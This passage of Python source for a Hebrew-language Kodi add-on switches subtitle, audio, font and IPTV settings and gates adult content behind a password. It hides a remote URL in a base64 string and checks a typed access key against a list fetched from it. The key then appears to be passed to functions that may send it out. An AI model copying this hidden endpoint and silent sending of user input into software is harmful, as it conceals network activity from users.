	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception
	xbmc.executebuiltin("ReloadSkin()")
def tv7():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":46},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception
	xbmc.executebuiltin("ReloadSkin()")
def tv8():
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.charset","value":"CP1251"}}')
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"arial.ttf"}}')
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
def tv9():
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.charset","value":"DEFAULT"}}')
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
def tv10():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"English"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', '[COLOR=yellow]הגדרת הורדת כתובית בוצעה בהצלחה[/COLOR]')))

def tv11():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Spanish"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', '[COLOR=yellow]הגדרת הורדת כתובית בוצעה בהצלחה[/COLOR]')))
def tv12():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Russian"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
def tv13():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','true')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Hebrew"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', '[COLOR=yellow]הגדרת הורדת כתובית בוצעה בהצלחה[/COLOR]')))
def tv14():
	xbmc.executebuiltin('Action(togglefullscreen)')
def tv15():
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.audiolanguage","value":"English"}}')
   xbmc.executebuiltin( "Action(audionextlanguage)" )
def tv16():
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.audiolanguage","value":"Russian"}}')
   xbmc.executebuiltin( "Action(audionextlanguage)" )

def reset_telemedia():
    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno(ADDONTITLE, "האם להאפס את חשבון הטלמדיה שלכם?", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    if choice == 1:
       iiI1iIiI = translatepath ( os . path . join ( 'special://home/userdata/addon_data' , 'plugin.video.telemedia' ) )
       xbmc.executebuiltin((u'Notification(%s,%s)' % ('לסיום הפעולה', 'הקודי יסגר אוטומטית')))
       shutil.rmtree(iiI1iIiI,ignore_errors=True, onerror=None)
       xbmc.sleep(4000)
       os._exit(1)
    else:
     sys.exit()



urlx = base64.b64decode("aHR0cDovL2tvZGkubGlmZS93aXphcmQ=").decode('utf-8') + oo
def SUBS_English():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"English"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
	  
      

      
def purnpass():
    input= (ADDON.getSetting("sex_pass"))
    dialog = xbmcgui.Dialog()
    search_entered=''
    keyboard = dialog.numeric(0, 'הכנס סיסמה')
    search_entered = keyboard
    if search_entered==input:
       xbmc.executebuiltin( "ActivateWindow(1113)" )
    else:
      LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]סיסמה שגויה[/COLOR]' % COLOR2)
      sys.exit()
def purnpass_change():

    dialog = xbmcgui.Dialog()
    search_entered=''
    keyboard = dialog.numeric(0, 'הכנס סיסמה חדשה')
    search_entered = keyboard
    ADDON.setSetting('sex_pass',search_entered)
    if not search_entered=='':
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הסיסמה עודכנה![/COLOR]' % COLOR2)

def SUBS_Spanish():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Spanish"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
def SUBS_Russian():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Russian"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
def SUBS_Portugezit():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Portuguese"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))  


def SUBS_Hebrew():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','true')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Hebrew"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))


def fix_font():
  src=__PLUGIN_PATH__ + "/resources/Font.xml"
  dst=translatepath ( 'special://home/addons/skin.Premium.mod/16x9')+"/Font.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'תיקון עבר בהצלחה')
  xbmc.executebuiltin("ReloadSkin()")
def disfix_font():
  src=__PLUGIN_PATH__ + "/resources/disFont.xml"
  dst=translatepath ( 'special://home/addons/skin.Premium.mod/16x9')+"/Font.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'ביטול פונט עבר בהצלחה')
  xbmc.executebuiltin("ReloadSkin()")

def userkey(urlx):
   try:
    search_entered=''
    keyboard = xbmc.Keyboard(search_entered, '')
    keyboard.doModal()
    if keyboard.isConfirmed():
           search_entered = keyboard.getText()
    remote_file = urlopen(urlx)
    x=remote_file.readlines()
    found=0
    try:
     for us in x:
        if us.decode('utf-8').split(' ==')[0] ==search_entered or us.decode('utf-8').split()[0]==search_entered :
            found=1
            break
    except:pass
    if found==0:
       # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Error[/COLOR]" % COLOR2)
       contact_wiz('סיסמה שגויה \nלפתיחת הנעילה יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')
       senderror(search_entered)
       sys.exit()
    else:
        xbmc.executebuiltin( "Skin.ToggleSetting(username)" )
        xbmc.executebuiltin( "ActivateWindow(home)" )
        send(search_entered)
   except:pass

def clear_search():
    try:
        remove2=os.path.join(translatepath("special://home/cache/archive_cache/"))
        if os.path.exists(remove2):
            for root, dirs, files in os.walk(remove2):
                for f in files:
                    os.unlink(os.path.join(root, f))
                # for d in dirs:
                    # shutil.rmtree(os.path.join(root, d))
            # os.rmdir(remove2)
    except:
        pass
    try:
        remove2=os.path.join(translatepath("special://home/temp/archive_cache/"))
        if os.path.exists(remove2):
            for root, dirs, files in os.walk(remove2):
                for f in files:
                    os.unlink(os.path.join(root, f))
                # for d in dirs:
                    # shutil.rmtree(os.path.join(root, d))
            # os.rmdir(remove2)
    except:
        pass
    try:
        remove2=os.path.join(translatepath("special://temp/archive_cache/"))
        if os.path.exists(remove2):
            for root, dirs, files in os.walk(remove2):
                for f in files:
                    os.unlink(os.path.join(root, f))
                # for d in dirs:
                    # shutil.rmtree(os.path.join(root, d))
            # os.rmdir(remove2)
    except:
        pass
def install_youtube():
    if not os.path.exists(xbmc.translatePath("special://home/addons/") + "plugin://inputstream.adaptive/"):
       xbmc.executebuiltin("RunPlugin(plugin://inputstream.adaptive)" )
    if not os.path.exists(xbmc.translatePath("special://home/addons/") + "plugin://plugin.video.youtube/") and os.path.exists(xbmc.translatePath("special://home/addons/") + "plugin://inputstream.adaptive/"):

            xbmc.executebuiltin("RunPlugin(plugin://plugin.video.youtube)" )
    string='ActivateWindow(10025,"plugin://plugin.video.youtube/",return)'
    xbmc.executebuiltin(string)
def black_srt_on():
    xx=xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.bgopacity","value":70}}')
    xbmc.executebuiltin('Container.Refresh')
def black_srt_off():
    xx=xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.bgopacity","value":0}}')
    xbmc.executebuiltin('Container.Refresh')
# install_youtube()
params=get_params()

url=None
name=None
mode=None
iconimage=None
fanart=None
description=None

try:
        url=unque(params["url"])
except:
        pass
try:
        name=unque(params["name"])
except:
        pass
try:
        iconimage=unque(params["iconimage"])
except:
        pass
try:        
        mode=int(params["mode"])
except:
        pass
try:        
        fanart=unque(params["fanart"])
except:
        pass
try:        
        description=unque(params["description"])
except:
        pass

if mode==None or url==None or len(url)<1:
        main_menu()

elif mode==11:
        fix_buffer()

elif mode==15:
        fix_font()

elif mode==20:
        fix_buffer2()
elif mode==21:
        fix_buffer3()

elif mode==23:
        skin_pfix()
elif mode==231:

        resetForcedView()
elif mode==24:
        skin_efix()
elif mode==200:
        resetSKinSetting()
elif mode==25:
        fix_buffer4()

elif mode==32:
        disfix_font()
elif mode==33:
        fix_buffer5()

elif mode==39:
        fix_buffer6()
elif mode==40:
        speed_test()

elif mode==43:
       RD_All()
elif mode==44:
       SUBS_English()
elif mode==45:
       SUBS_Spanish()
elif mode==46:
       SUBS_Russian()
elif mode==416:
       SUBS_Portugezit()
elif mode==47:
       SUBS_Hebrew()

elif mode==70:
        reset_telemedia()
elif mode==290:
        purnpass()
elif mode==291:

    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno(ADDONTITLE, "האם תרצה להגדיר את חשבון ה IPTV?", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    if choice == 1:
        xbmc.executebuiltin("RunPlugin(plugin://pvr.iptvsimple)")
        xbmc.executebuiltin("RunPlugin(plugin://plugin.program.mediasync/?mode=22&url=www)")

        xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')

    else:
     sys.exit()
elif mode==295:



    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno(ADDONTITLE, "האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    if choice == 1:
        xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=4&amp;module=iptv)")
        xbmc.executebuiltin( "ActivateWindow(home)" )
        # iptvidanplus()
        # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
    else:
     sys.exit()
elif mode==296:
        userkey(urlx)

elif mode==297:

    iptvkodi17()
elif mode==298:

    traktsync()
elif mode==300:

    skindialogsettind17()
elif mode=='purnpass'   : purnpass()
elif mode==301   : purnpass_change()
elif mode==51:     buffer()
elif mode==52:     kodi_usermenu()
elif mode==53:     USER_KODION()
elif mode==54:     rd_menu()
elif mode==182:    Set_OSD()
elif mode==183:    setrealdebrid()
elif mode==184:    rdoff()
elif mode==185:    logsend()#logsendme(enable_debug_notice=True)#logsend()
elif mode==186:    set_nextup()
elif mode==302:    tele_account()
elif mode==303:    ADDON.openSettings()
elif mode==304:    menuoptions()
elif mode==305:
        p_mod()
elif mode==306:

    clear_search()
elif mode==307:
    install_youtube()
elif mode==308:
    traktsync_newinstall()
elif mode==309:

    black_srt_on()
elif mode==310:

    black_srt_off()
if len(sys.argv)>0:

   xbmcplugin.endOfDirectory(int(sys.argv[1]))
